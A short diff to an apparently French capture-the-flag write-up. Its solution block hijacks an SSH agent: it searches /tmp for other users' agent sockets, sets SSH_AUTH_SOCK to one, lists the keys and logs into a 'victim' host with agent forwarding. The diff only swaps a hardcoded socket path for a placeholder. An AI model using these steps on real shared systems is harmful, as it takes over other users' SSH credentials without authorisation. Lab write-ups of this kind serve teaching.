@@ -23,7 +23,7 @@ IPNET{mot_de_passe_ou_cle}
 ## Solution (Write-up)
 ```bash
 find /tmp -type s -name 'agent.*' 2>/dev/null
-export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1234
+export SSH_AUTH_SOCK=<chemin_socket_trouve_par_find>
 ssh-add -l
 ssh -A victim@10.10.10.26
 ```
